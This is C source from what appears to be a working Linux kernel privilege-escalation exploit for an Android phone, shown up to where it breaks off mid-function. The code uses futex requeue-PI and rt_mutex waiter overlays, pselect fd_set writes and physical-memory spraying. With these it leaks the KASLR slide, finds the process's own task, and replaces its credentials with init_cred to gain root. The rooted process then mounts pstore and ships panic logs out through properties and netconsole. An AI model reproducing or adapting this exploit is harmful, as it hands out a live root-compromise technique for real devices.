#include "common.h"
#include <linux/reboot.h>

/* Option 2' experiment (see ZENFONE9_STATUS.md ?78/?79).
 *
 * The PI walk poisons our payload page by writing the *overlay waiter's kernel
 * stack address* into lock->waiters.rb_leftmost (lock+0x10) and w0.tree.rb_left
 * (w0+0x10).  rt_mutex_top_waiter() later reads rb_leftmost back through
 * rb_first_cached(), so the next primitive dereferences it as an rt_mutex_waiter
 * - fatal once that thread's stack is gone.
 *
 * If ONE waiter thread serves all rounds, the overlay lands at the SAME kernel
 * stack slot every round, so the poisoned pointer is re-armed with a live,
 * controlled overlay each round - the page heals itself without any userspace
 * repair (which is impossible on the device, where the page is skb data).
 *
 * Each round uses a FRESH futex word triple (fresh hash bucket => no stale
 * rt_mutex/pi_state from the previous round); the waiter/owner/consumer threads
 * are created ONCE. */

#define PR_ROUNDS 128
#define PR_ROUTE_NFDS 320

/* ?113.21: name of the thread that drives the sequence.  The entry_task read
   returns whoever is current on the CPU, so the verify round checks this exact
   string back out of task->comm. */
#define PR_MAIN_COMM "zf9m0001"

/* ---- B'' target: the tail of init_task.tasks ------------------------------
   fork.c:2346 list_add_tail_rcu(&p->tasks, &init_task.tasks) runs for the
   process LEADER only (threads go on group_leader->thread_group / signal->thread_head),
   so init_task.tasks.prev is the most recently created PROCESS.  Our process is
   normally the youngest thing on the device, and the leader IS the main thread -
   exactly the task we want the credentials for.  If another process forked after
   us the verify round sees a foreign comm and aborts cleanly; the read's damage
   (init_task+0x4D8 = pushable_tasks.prio + padding, inert on the CFS idle task)
   is harmless, so the fix is simply to run the binary again. */

static uint32_t pr_wait[PR_ROUNDS];
static uint32_t pr_target[PR_ROUNDS];
static uint32_t pr_chain[PR_ROUNDS];

/* probe-delta mode: cycle the boot_id.data alias through candidate deltas; only
   the true one should land.  Wrong deltas exercise the "write into real RAM at
   +~44MB" path that only ever happens on the device during enumeration. */
static const uintptr_t pr_cands[] = {0x200000, 0, 0x10000, 0x80000};
static int pr_probe_deltas;
static uintptr_t pr_cand_delta;

/* Number of leading rounds that are SLIDE rounds (leak the KASLR slide with the
   SLIDE word table + SIGALRM trigger) instead of direct rounds.  Porting the
   slide onto the persistent waiter is required: ?80.4 showed that a slide round
   on a DIFFERENT thread poisons the page with that thread's stack address. */
static int pr_slide_rounds;
static int pr_skip_sigalrm;
static int pr_cycle_prio = 1;   /* invariant: every round must present a real prio delta */
static int pr_cycle_ovl = 1;
/* ---- device-order sequence mode (see STATUS ?84) -------------------------
   probe(known-plaintext) -> slide -> read __per_cpu_offset -> read __entry_task
   -> read init_cred.security -> write it into the in-page fake_cred
   -> task->real_cred = init_cred -> task->cred = init_cred -> normalise.
   Retries advance the round index, so the prio-delta parity advances too. */
static int pr_seq;
static int pr_seq_cfi;   /* §124.13: Path A mini-seq (slide -> fops redirect) */
static int pr_seq_vcfi_min;  /* §124.21: minimal vcfi seq (6 rounds, init_cred) */
static int pr_restamp_armed; /* §124.77 Q12: restamp fires once post-rebuild */
/* §124.78: restamp DISABLED by default - attempt 99-102 proved the TAG itself
   is lethal (tree_right 0->non-canonical TAG turns the safe empty subtree
   into a wild deref; all four died in the banner walk, earlier than the step-2
   baseline).  A chase-chain probe must NOT alter geometry.  Re-enable only
   with a canonical TAG (or stamp a data word, never a pointer word). */
static int pr_restamp_enable;
/* §124.46: nsproxy slide source (token `slidens`).  Default 0 = loggers anchor
   (legacy); 1 = read init_task+0x7d0 for the nsproxy pointer (boot-invariant
   anchor - immune to the netd timing that poisons the loggers slots).
   Non-static: util.c's SLIDE payload builder follows the same anchor.
   §124.94: tasksprev source (token `slidetp`, value 2).  Fixup-safe anchor:
   init_task.tasks.prev field (list_head next = true task, empty pi tree). */
int pr_slide_ns;
int perf_slide_requested;
int perf_bisect_parent; /* §124.111: 1 = bisect mode (parent back to anchor) */
int perf_bisect_left; /* §124.112: 1 = bisect mode 2 (left back to B) */
/* §124.108 Q2: 1 = current round is a write round (parent := in-page fake
   anchor, see pr_build_fdsets).  Set by plan, consumed per-round. */
int pr_wparent;
static int pr_seq_start;
/* ???103 sweep: delta-major x candidate probe grid */
static int pr_sweep;
static int pr_sweep_hit;
static int pr_preflight_done;
static int pr_hit_step_pending;
/* §124.52 banner gatekeeper: after SWEEP HIT, the first seq round reads
   linux_banner (known ASCII "Linux version 5.10...") instead of the slide
   anchor.  If the pipe cannot deliver a known constant, the slide read that
   follows is untrustworthy - fail fast (reboot) instead of walking the seq
   on garbage.  Does NOT consume a step number. */
static int pr_banner_pending;
/* "Linux ve" little-endian u64 (first 8 bytes of linux_banner). */
#define LINUX_BANNER_U64 0x65762078756e694cULL
/* §124.52 poison bait: after SWEEP HIT, stamp a nonce over the page-head magic
   (the seq never reads the head magic - fake structures live at 0x100+).
   If any later read returns the nonce, that walk never took the copy path. */
#define POISON_BAIT_U64 0xB41F0001B41F0001ULL
static int pr_baited;
static int pr_sweep_d;
static int pr_sweep_c;
/* §124.38: reverse sweep + single-pass stop.  pr_sweep_dir=-1 walks the grid
   backwards (from sweepstart down); pr_sweep_end>=0 stops the run cleanly when
   the NEXT entry to arm would pass the end marker (direction-aware), so a
   finished sweep exits instead of wrapping into known-killer entries. */
static int pr_sweep_dir = 1;
static int pr_sweep_end = -1;
/* §124.36 amend (i): the armed probe's coordinates, snapshotted BEFORE
   pr_sweep_c++ (which runs at the end of the arm block).  The pre-line and the
   hit lines must use these: reading pr_sweep_d/pr_sweep_c after the walk
   reports the NEXT entry (off-by-one). */
static int pr_fire_d;
static int pr_fire_c;
#define PR_SWEEP_CANDS 32
#ifdef ZF9_DEVICE
/* §124.15: on the device the delta is a KNOWN constant (0x28000000, from
   uefi.img [MemoryMap] and validated on-device), so the sweep must NOT cycle
   wrong deltas: a wrong-delta probe writes 8 bytes at the wrong alias, which
   QEMU tolerates (idle RAM) but the device does not - the first device physmap
   run panicked on probe #1 (delta=0, round 1).  One delta only; the candidate
   axis still sweeps to find one of our spray pages. */
static const uintptr_t pr_sweep_deltas[] = {0x28000000};
static const int pr_sweep_ndeltas = 1;
#else
static const uintptr_t pr_sweep_deltas[] = {0x0, 0x10000, 0x200000, 0x80000};
static const int pr_sweep_ndeltas = 4;
#endif
static uintptr_t pr_sweep_phys_pair(int d, int c) {
  /* 4 KB-aligned, spread uniformly across the candidate physical pool.
     Device pool = BOTH RAM banks (two-bank grid, high bank first); QEMU pool
     = its low RAM. */
#ifdef ZF9_DEVICE
  /* §124.35: the device RAM is fragmented into TWO banks (§36 block map):
     [2GB,4GB) (128 MB blocks 16..31) and [32GB,38GB) (blocks 256..303).  A
     1.5 GB spray can land in either bank; the two all-miss runs (10 samples
     over the HIGH bank only) prove it sometimes does not land in the high
     bank at all - and with a 614 MB stride a 1.5 GB region inside the pool is
     mathematically guaranteed to contain a sample, so all-miss == "not in that
     bank".  Split the grid across both banks; within each bank consecutive
     samples are <= 1.5 GB apart, so any 1.5 GB region lying inside a bank is
     covered.
     §124.36 amend (ii): HIGH bank entries come FIRST.  All four historical
     hits landed in the high bank, so high-first minimises expected probes to
     hit (and kernel exposure).  The low-bank entries still run - they answer
     the open question "does the spray ever land in the low bank" (no negative
     evidence yet) - just later. */
  const uintptr_t lo_a = 0x80010000ULL, hi_a = 0x100000000ULL;   /* [2G,4G)   */
  const uintptr_t lo_b = 0x800010000ULL, hi_b = 0x97ff00000ULL;  /* [32G,38G) */
  int total = pr_sweep_ndeltas * PR_SWEEP_CANDS;
  int b_cnt = (total * 2 + 2) / 3;   /* ~2/3 of the grid: high bank first */
  if (b_cnt < 2) {
    b_cnt = 2;
  }
  int idx = d * PR_SWEEP_CANDS + c;
  uintptr_t phys;
  if (idx < b_cnt) {
    uintptr_t stride = (hi_b - lo_b) / (uintptr_t)b_cnt;
    phys = lo_b + (uintptr_t)idx * stride + stride / 2;
  } else {
    int a_cnt = total - b_cnt;
    int ai = idx - b_cnt;
    if (ai >= a_cnt) {
      ai = a_cnt - 1;
    }
    uintptr_t stride = (hi_a - lo_a) / (uintptr_t)a_cnt;
    phys = lo_a + (uintptr_t)ai * stride + stride / 2;
  }
  return phys & ~(uintptr_t)0xfff;
#else
  const uintptr_t lo = 0x44000000ULL, hi = 0x7e000000ULL;
  uintptr_t span = hi - lo;
  uintptr_t stride = span / (uintptr_t)(pr_sweep_ndeltas * PR_SWEEP_CANDS);
  uintptr_t off = ((uintptr_t)d * PR_SWEEP_CANDS + (uintptr_t)c) * stride + stride / 2;
  return (lo + off) & ~(uintptr_t)0xfff;
#endif
}
int g_forensic = 0;                 /* §122.19 set by the `forensic` argv token */
#define FORENSIC_WINDOW_S 1200      /* 20 min collection window before sysrq-b */

static int pr_seq_step;
/* §124.124 short seq (see common.h). */
int pr_short_seq;
void persist_set_short_seq(int on) { pr_short_seq = on ? 1 : 0; }
/* ?115.2: the boot UUID as read at stage start - the restore round's oracle. */
static unsigned char pr_boot0[16];
/* §122.11 #2: the boot UUID in string form, snapshotted by the PARENT before the
   seq redirects boot_id.data.  The victim prints this as its birth certificate
   (reading /proc/.../boot_id from inside the seq returns redirected kernel
   memory - the first read poisoned by our own state, not by the environment). */
static char pr_boot_uuid[40];

/* §122.11 #3: clear persist.zfr.* residue from previous runs.  persist.* needs
   root to write (shell cannot), so the rooted victim does it, restoring the
   runbook's "assert = 0" semantics.  debug.* is NOT cleared: it is in-memory and
   already empty after a reboot, and it is the freshness oracle (§122.6). */
static void pr_vwrite(const char *fmt, ...);   /* defined below (§115.4) */
static void pr_victim_clear_props(void) {
  char name[40];
  int n = 0;
  for (int i = 0; i <= 130; i++) {
    snprintf(name, sizeof(name), "persist.zfr.%d", i);
    if (prop_raw_set(name, "") == 0) {
      n++;
    }
  }
  for (int i = 200; i <= 220; i++) {
    snprintf(name, sizeof(name), "persist.zfr.%d", i);
    if (prop_raw_set(name, "") == 0) {
      n++;
    }
  }
  /* §122.22: the reserved forensic range (190-193) must be cleared too, else the
     disarm results (`oops=2/111`, `hung=2/2`) persist across boots and cannot be
     used to tell "armed in THIS boot"; they were byte-identical to the previous
     session's readings after a run that never rooted. */
  for (int i = 190; i <= 193; i++) {
    snprintf(name, sizeof(name), "persist.zfr.%d", i);
    if (prop_raw_set(name, "") == 0) {
      n++;
    }
  }
  pr_vwrite("[V] cleared persist.zfr residue (%d names)\n", n);
}
/* ?115.5 A-plan: the race-free anchor (init_task.tasks.next = PID 1) and init's
   cred object, into which the victim's real_cred/cred pointers are written. */
static uintptr_t pr_init_task;
static uintptr_t pr_init_cred;
static uintptr_t pr_init_node;   /* unused after ?116 (>cad_pid route) */
static uintptr_t pr_pid1;        /* PID 1's struct pid (from cad_pid) */
/* ?115.6 the anchor's expected comm, read from the OBSERVABLE PID 1 at startup
   (/proc/1/comm): on the device that is "init", in the QEMU guest it is whatever
   the initramfs /init script runs as - hardcoding "init" would make the check
   untestable in QEMU and would not even verify more than this does. */
static char pr_anchor_comm[16];
static int pr_seq_attempt;
static int pr_seq_fatal;   /* ?113.18: verify failed - stop, do not touch creds */
static uintptr_t pr_seq_q;
static uintptr_t pr_seq_percpu_delta;
static uintptr_t pr_seq_task;
static uintptr_t pr_seq_blob;
static int pr_slide_this_round;
static uintptr_t pr_own_want;   /* ?109 self-write probe: expected written value */
static int pr_own_done;         /* ?109 self-write probe: hit seen, stop cleanly */
static atomic_int pr_cur_round;

/* wake pipe: the consumer pokes this after its sched_setattr completes so the
   waiter's pselect returns immediately instead of waiting out its timeout. */
static int pr_wake[2] = {-1, -1};
/* §124.17 Option 1: shared "redirect has landed" flag for the rooted victim
   (a fork inherits only a COW copy of ordinary globals) + the mode switch. */
int g_victim_cfi = 0;
static volatile int *pr_cfi_ready;

static atomic_int pr_waiter_go;
/* ?103.5 epoch: stamped by the waiter immediately BEFORE it enters pselect6, so
   the consumer's gate can require "in pselect6 AND it is THIS round's pselect".
   Without it a stale overlay from the previous round can be walked; after a
   retarget its word7 (old candidate's fake_lock) disagrees with the page's
   retargeted fake_w0.lock => BUG_ON(w->lock != lock) in rt_mutex_top_waiter. */
static atomic_int pr_pselect_epoch;
static uintptr_t g_hit_alias; /* frozen once at sweep hit (single source) */
static atomic_int pr_owner_go;
static atomic_int pr_release;
static atomic_int pr_stop;
static atomic_int pr_waiter_ready;
static atomic_int pr_owner_ready;
static atomic_int pr_owner_released;
static atomic_int pr_round_done;
static atomic_int pr_consumer_go;
static atomic_int pr_consumer_stop;
static atomic_int pr_consumer_calls;
static atomic_int pr_consumer_ok;
static atomic_int pr_waiter_tid;
/* §124.124 overlay landing gate: set by pr_waiter immediately before
   FUTEX_WAIT_REQUEUE_PI (after the owner_ready spin), so the main thread can
   withhold the SIGUSR1 until the waiter is at the exact syscall depth. */
static atomic_int pr_waiter_inwait;
static atomic_int pr_trace_seq;

static int pr_requeue_only(void) {
  const char *e = getenv("GL_REQUEUE_ONLY");
  return e && *e && strcmp(e, "0") != 0;
}

static int pr_pselect_only(void) {
  const char *e = getenv("GL_PSELECT_ONLY");
  return e && *e && strcmp(e, "0") != 0;
}

static int pr_sched_snapshot_enabled(void) {
  const char *e = getenv("GL_SCHED_SNAPSHOT");
  return e && *e && strcmp(e, "0") != 0;
}

static long pr_sched_getattr_tid(int tid, struct local_sched_attr *attr) {
  memset(attr, 0, sizeof(*attr));
  attr->size = sizeof(*attr);
  return syscall(SYS_sched_getattr, tid, attr, sizeof(*attr), 0);
}

static void pr_trace_sched(const char *stage, int tid, long ret, int error,
                           const struct local_sched_attr *attr) {
  const char *path = getenv("GL_TRACE_FILE");
  if (!path || !*path) {
    return;
  }
  int saved_errno = errno;
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
  if (fd >= 0) {
    char buf[384];
    int seq = atomic_fetch_add(&pr_trace_seq, 1) + 1;
    int n = snprintf(buf, sizeof(buf),
                     "seq=%d pid=%d tid=%d stage=%s target_tid=%d ret=%ld errno=%d "
                     "size=%u policy=%u flags=%llx nice=%d prio=%u runtime=%llx "
                     "deadline=%llx period=%llx\n",
                     seq, getpid(), (int)syscall(SYS_gettid), stage, tid, ret,
                     error, attr->size, attr->sched_policy,
                     (unsigned long long)attr->sched_flags, attr->sched_nice,
                     attr->sched_priority, (unsigned long long)attr->sched_runtime,
                     (unsigned long long)attr->sched_deadline,
                     (unsigned long long)attr->sched_period);
    if (n > 0) {
      size_t off = 0;
      while (off < (size_t)n) {
        ssize_t w = write(fd, buf + off, (size_t)n - off);
        if (w <= 0) {
          break;
        }
        off += (size_t)w;
      }
      (void)fsync(fd);
    }
    close(fd);
  }
  errno = saved_errno;
}

static void pr_record_sched_snapshot(const char *stage, int tid) {
  if (!pr_sched_snapshot_enabled()) {
    return;
  }
  struct local_sched_attr attr;
  errno = 0;
  long ret = pr_sched_getattr_tid(tid, &attr);
  int error = errno;
  pr_trace_sched(stage, tid, ret, error, &attr);
}

static void pr_trace(const char *stage, long value, long error) {
  const char *path = getenv("GL_TRACE_FILE");
  if (!path || !*path) {
    return;
  }
  int saved_errno = errno;
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
  if (fd >= 0) {
    char buf[256];
    int seq = atomic_fetch_add(&pr_trace_seq, 1) + 1;
    int n = snprintf(buf, sizeof(buf),
                     "seq=%d pid=%d tid=%d stage=%s value=%ld errno=%ld\n",
                     seq, getpid(), (int)syscall(SYS_gettid), stage, value,
                     error);
    if (n > 0) {
      size_t off = 0;
      while (off < (size_t)n) {
        ssize_t w = write(fd, buf + off, (size_t)n - off);
        if (w <= 0) {
          break;
        }
        off += (size_t)w;
      }
      (void)fsync(fd);
    }
    close(fd);
  }
  errno = saved_errno;
}

static void pr_alarm_handler(int sig);
static int pr_thread_in_pselect(int tid);

static int pr_gate_syscall = 1;

/* True iff the given task is blocked in pselect6.  /proc/<tid>/syscall prints
   "nr arg0 ..." while blocked (or "running").  Matching the syscall NUMBER
   removes the S-state blind spot that let the consumer walk a stack whose
   overlay was not yet installed. */
static int pr_thread_in_pselect(int tid) {
  char path[64];
  char buf[128];
  snprintf(path, sizeof(path), "/proc/%d/syscall", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *end = NULL;
  long nr = strtol(buf, &end, 10);
  return end != buf && nr == (long)SYS_pselect6;
}

static int pr_words_per_set(void) {  int bpw = (int)(8 * sizeof(unsigned long));
  return (PR_ROUTE_NFDS + bpw - 1) / bpw;
}

static void pr_put_word(
    fd_set *in, fd_set *out, fd_set *ex, int wps, int gw, uint64_t v) {
  if (gw < 0) {
    return;
  }
  int set_idx = gw / wps;
  int word_idx = gw % wps;
  if (set_idx == 0) {
    fdset_put_word(in, word_idx, v);
  } else if (set_idx == 1) {
    fdset_put_word(out, word_idx, v);
  } else if (set_idx == 2) {
    fdset_put_word(ex, word_idx, v);
  }
}

static void pr_build_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  /* §124.108 Q2 fake-anchor: write rounds (pr_wparent=1, set by plan case 4/5/6)
     point parent at an in-page all-zero node (page_base+0x500, 16 B, never
     written by templates/collateral) instead of the true-kernel value.
     __rb_erase_color then sees sibling NULL at the first iteration and
     terminates without chasing live data.  Read rounds keep parent=value. */
  extern int pr_wparent;
  uintptr_t parent = (pr_wparent && page_base) ? page_base + 0x500 : value;
  /* §124.109: write rounds use self-left (fake-anchor+0x10, in-page zero)
     for the same reason as slide.c - left=B would chase live kernel state. */
  uintptr_t left = (pr_wparent && page_base) ? page_base + 0x510 : target;
  /* ?113.24 (i-b) boundary #4: shape 1 is DELETED, not merely guarded.  Its
     table planted tree_right = value, and the killer word in ?113.22/?113.23
     was a nonzero child pointer; "right == 0" is now a CONSTRUCTIVE fact of
     this table.  Reviving shape 1 requires a calibrated unicorn model first
     (?113.20: the old model was a summary, not the execution). */
  if (pselect_write_shape() != 0) {
    pr_error("shape %d requested but shape 1 is deleted (?113.24); refusing\n",
             pselect_write_shape());
    abort();
  }
  /* 5.10 flat rt_mutex_waiter: tree(0x0) pi_tree(0x18) task(0x30) lock(0x38)
     prio(0x40) deadline(0x48). */
  struct { int w; uint64_t v; } words[10] = {
    {0, parent}, {1, 0}, {2, left},
    {3, parent}, {4, 0}, {5, left},
    {6, fake_task}, {7, fake_lock},
    {8, pr_cycle_ovl ? (uint64_t)(FAKE_WAITER_PRIO + (atomic_load(&pr_cur_round) & 1)) : (uint64_t)FAKE_WAITER_PRIO}, {9, 0},
  };
  int wps = pr_words_per_set();
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    pr_put_word(in, out, ex, wps, PSELECT_WAITER_WORD_SHIFT + words[i].w,
                words[i].v);
  }
}

static void pr_open_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PR_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_error("persist F_DUPFD errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PR_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PR_ROUTE_NFDS - 1);
  FD_SET(PR_ROUTE_NFDS - 1, ex);
}

static void pr_overlay_round(int idx, int slide) {
  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, PR_ROUTE_NFDS + 16);
  if (high_read < 0) {
    pr_error("persist overlay F_DUPFD errno=%d\n", errno);
    return;
  }
  fd_set in;
  fd_set out;
  fd_set ex;
  if (slide) {
    prepare_slide_pselect_fdsets(&in, &out, &ex);
    open_slide_selected_fds(&in, &out, &ex, high_read);
  } else {
    pr_build_fdsets(&in, &out, &ex);
    pr_open_fds(&in, &out, &ex, high_read);
  }

  atomic_store(&pr_consumer_calls, 0);
  atomic_store(&pr_consumer_ok, 0);
  atomic_store(&pr_consumer_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  atomic_store(&pr_consumer_go, idx + 1);

  atomic_store(&pr_pselect_epoch, idx + 1);
  struct timespec ts = {.tv_sec = PSELECT_TIMEOUT_SEC, .tv_nsec = 0};
  pr_trace("before-pselect", idx, slide);
  errno = 0;
  int ret = pselect(PR_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
  int saved_errno = errno;
  pr_trace("after-pselect", ret, saved_errno);
  atomic_store(&pr_consumer_go, 0);
  pr_info("persist round=%d overlay%s ret=%d errno=%d calls=%d ok=%d\n",
          idx, slide ? "(slide)" : "", ret, saved_errno,
          atomic_load(&pr_consumer_calls), atomic_load(&pr_consumer_ok));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

/* ?113.30 victim burst.  On a live Android the newest process is almost never
   us, so the B'' tail read (init_task.tasks.prev) picks a system process and the
   verify round catches it (device run: comm[0..7]="_rre_isd").  Fix: the
   CONSUMER forks a short burst of children immediately before its sched_setattr
   - i.e. microseconds before the write lands - so the tail is ours.  The
   children inherit comm=PR_MAIN_COMM (the verify key) and park forever: a dead
   task would be freed before the cred writes.  They also watch their own uid and
   report when the cred swap lands on them. */
#define PR_VICTIM_BURST 8
static int pr_victim_rounds;    /* round whose write reads tasks.prev (0 = none) */
static int pr_victims_forked;

/* ?115.4 fork-safe output for the victims.  A victim is forked from a
   MULTITHREADED process, so the child inherits a snapshot of stdio's locks: if
   another thread held the stdout lock at fork time the child deadlocks in
   printf forever (device symptom: victim uid=0, no syscall, no output at all -
   run.log had zero [V] lines while ps showed the root victim).  vsnprintf into a
   local buffer + raw write() takes no lock and is async-signal-safe. */
static void pr_vwrite(const char *fmt, ...) {
  char b[384];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(b, sizeof(b), fmt, ap);
  va_end(ap);
  if (n <= 0) {
    return;
  }
  if (n > (int)sizeof(b) - 1) {
    n = (int)sizeof(b) - 1;
  }
  /* ?115.5: /dev/kmsg is the ONLY reliable channel for a kernel-domain task.
     The device showed a rooted victim producing zero output while its fd 1 was
     /data/local/tmp/run.log -> SELinux denies kernel-domain writes to a
     shell_data_file, so the stdout report is silently dropped.  /dev/kmsg goes
     to the kernel log, which adb logcat -b kernel can read from shell. */
  static int kmsg = -2;
  if (kmsg == -2) {
    kmsg = open("/dev/kmsg", O_WRONLY);
  }
  if (kmsg >= 0) {
    ssize_t w = write(kmsg, b, (size_t)n);
    (void)w;
  }
  ssize_t w2 = write(1, b, (size_t)n);   /* keep stdout too (works in QEMU) */
  (void)w2;
}

/* ?115.1 experiment 0 (runs inside the ROOTED victim, so a root window is spent
   usefully): is the kernel-domain root usable?  Three questions in one shot -
   (a) the SELinux domain label we inherited from init_cred's security blob,
   (b) can we exec /system/bin/sh (or does the policy block it),
   (c) the ?114.3 #1 attribution window: dropbox / tombstones are root-only.
   Then close(1,2) so the parked victims stop holding the adb pipe open (?114.3 #3). */
/* ?119.7 victim-side exfil.  Order is the ?118.5 discipline: PSTORE FIRST (it is
   the only copy of the round-8 panic text; ramoops is a ring that any later
   panic resets).  Every chunk goes to BOTH property channels through prop_chunk
   (persist survives sysrq-b; debug only lives inside the 30 s window). */
static void pr_victim_exfil(void) {
  static const char *paths[] = {
    "/sys/fs/pstore/dmesg-ramoops-0", "/sys/fs/pstore/dmesg-ramoops-1",
    "/sys/fs/pstore/console-ramoops-0", "/sys/fs/pstore/console-ramoops-1",
    "/sys/fs/pstore/dmesg-ramoops",   "/sys/fs/pstore/console-ramoops",
  };
  char *buf = malloc(256 * 1024);
  if (!buf) {
    return;
  }
  /* ?119.9: "pstore not mounted" must not masquerade as "no panic text" - that
     would be a false negative in the one run this whole plan exists for.  Probe
     the directory, try the mount ourselves (init domain may), and report which
     case we are in. */
  int mounted = 0;
  {
    DIR *pd = opendir("/sys/fs/pstore");
    if (pd) {
      mounted = 1;
      closedir(pd);
      pr_vwrite("[V-exfil] pstore already mounted\n");
    } else {
      long mr = syscall(SYS_mount, "none", "/sys/fs/pstore", "pstore", 0UL,
                        (void *)NULL);
      pr_vwrite("[V-exfil] pstore not mounted; mount rc=%ld errno=%d\n", mr,
                errno);
      prop_chunk(900, 0, mr == 0 ? "PSTORE-MOUNT-OK" : "PSTORE-MOUNT-FAILED");
      DIR *pd2 = opendir("/sys/fs/pstore");
      if (pd2) {
        mounted = 1;
        closedir(pd2);
      }
    }
  }
  int got = 0;
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]) && !got; i++) {
    int fd = open(paths[i], O_RDONLY);
    if (fd < 0) {
      continue;
    }
    ssize_t n = read(fd, buf, 256 * 1024 - 1);
    close(fd);
    if (n <= 0) {
      continue;
    }
    buf[n] = 0;
    /* trim to ~1.5 KB around the first "Call trace" (?118.6 #3): the ring mixes
       audit/avc noise with the panic text we actually want. */
    char *hit = strstr(buf, "Call trace");
    if (!hit) {
      hit = strstr(buf, "Unable to handle");
    }
    char *start = buf;
    if (hit) {
      start = hit - 700;
      if (start < buf) {
        start = buf;
      }
    }
    size_t len = strlen(start);
    if (len > 1600) {
      len = 1600;
    }
    pr_vwrite("[V-exfil] pstore=%s len=%zu hit=%d\n", paths[i], len,
              hit != NULL);
    int total = (int)((len + 59) / 60);   /* 60 payload chars per property */
    if (total > 40) {
      total = 40;   /* bounded: the window is scarce */
    }
    if (total < 1) {
      total = 1;
    }
    for (int s = 0; s < total; s++) {
      char piece[64];
      size_t off = (size_t)s * 60;
      size_t m = len - off;
      if (m > 60) {
        m = 60;
      }
      memcpy(piece, start + off, m);
      piece[m] = 0;
      for (size_t k = 0; k < m; k++) {   /* no newlines inside a value */
        if (piece[k] == '\n' || piece[k] == '\r') {
          piece[k] = '|';
        }
      }
      int rc = prop_chunk(s, total, piece);
      pr_vwrite("[V-exfil] chunk %d/%d rc=%d\n", s, total, rc);
    }
    got = 1;
  }
  if (!got) {
    char msg[64];
    snprintf(msg, sizeof(msg), "NO-PSTORE-TEXT mounted=%d", mounted);
    pr_vwrite("[V-exfil] %s\n", msg);
    prop_chunk(0, 1, msg);
  }
  free(buf);
}

/* §122 netconsole: a kernel-level printk console that ships the panic text as
   UDP straight to the host, bypassing logd/logcat/adb entirely (netconsole
   transmits from IRQ context, so it survives the panic path - unlike any
   userspace streamer, whose chance after smp_send_stop is structurally ZERO).
   Structure first, then install: (a) can we mount configfs and is the
   netconsole dir present (CONFIG_NETCONSOLE), (b) if the operator pushed
   /data/local/tmp/nc.conf, install a target, (c) verify the transport by
   triggering a harmless printk (SysRq-h prints help) and letting the host
   check its UDP listener. */
static int nc_write(const char *dir, const char *name, const char *val) {
  char p[256];
  snprintf(p, sizeof(p), "%s/%s", dir, name);
  int fd = open(p, O_WRONLY);
  if (fd < 0) {
    return -1;
  }
  ssize_t w = write(fd, val, strlen(val));
  close(fd);
  return w < 0 ? -1 : 0;
}

static void nc_parse(const char *cfg, const char *key, char *out, size_t outsz) {
  out[0] = 0;
  const char *p = strstr(cfg, key);
  if (!p) {
    return;
  }
  p += strlen(key);
  if (*p != '=') {
    return;
  }
  p++;
  size_t i = 0;
  while (*p && *p != '\n' && *p != '\r' && i + 1 < outsz) {
    out[i++] = *p++;
  }
  out[i] = 0;
}

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void pr_victim_netconsole(void) {
  char out[224];
  /* §122.5 (TODO 3): marker blocks.  The §122.4 device run stalled between the
     last probe chunk (115 = sysrq-h) and the first netconsole chunk, so the
     function's own progress must be observable step by step.
     The configfs MOUNT is deliberately NOT attempted: it is the only blocking
     syscall on this path (the stuck victim sat in S with no further chunks) and
     Android normally has configfs mounted at boot - opendir alone decides. */
  prop_chunk(210, 0, "nc-enter");
  DIR *d = opendir("/sys/kernel/config");
  int mounted = 0;
  if (d) {
    mounted = 1;
    closedir(d);
  }
  snprintf(out, sizeof(out), "nc-cfgfs-opendir=%d (mount not attempted)", mounted);
  prop_chunk(211, 0, out);
  if (!mounted) {
    prop_chunk(212, 0, "nc-cfgfs-not-mounted - install skipped");
    return;
  }
  struct stat st;
  int have = (stat("/sys/kernel/config/netconsole", &st) == 0);
  snprintf(out, sizeof(out), "nc-stat-netconsole=%d", have);
  prop_chunk(213, 0, out);
  snprintf(out, sizeof(out), "netconsole cfgfs=%d dir=%d", mounted, have);
  prop_chunk(200, 0, out);
  if (!have) {
    return;
  }

  char cfg[512];
  int n = 0;
  int fd = open("/data/local/tmp/nc.conf", O_RDONLY);
  if (fd >= 0) {
    n = (int)read(fd, cfg, sizeof(cfg) - 1);
    close(fd);
  }
  if (n <= 0) {
    prop_chunk(201, 0, "nc.conf absent - no install attempted");
    return;
  }
  cfg[n] = 0;
  char host[64], port[16], dev[64], laddr[64], mac[32];
  nc_parse(cfg, "HOST", host, sizeof(host));
  nc_parse(cfg, "PORT", port, sizeof(port));
  nc_parse(cfg, "DEV", dev, sizeof(dev));
  nc_parse(cfg, "LOCAL_IP", laddr, sizeof(laddr));
  /* §122.4 (3): backdoor for stubborn ARP - copy the host MAC from ipconfig */
  nc_parse(cfg, "MAC", mac, sizeof(mac));
  if (!port[0]) {
    snprintf(port, sizeof(port), "6666");
  }

  /* §122.4 (1) PRIME FIRST, then enable.  A plain UDP datagram to host:port
     before arming netconsole does two jobs: it proves the path in userspace
     (route / interface / host firewall) *before* the kernel console exists, and
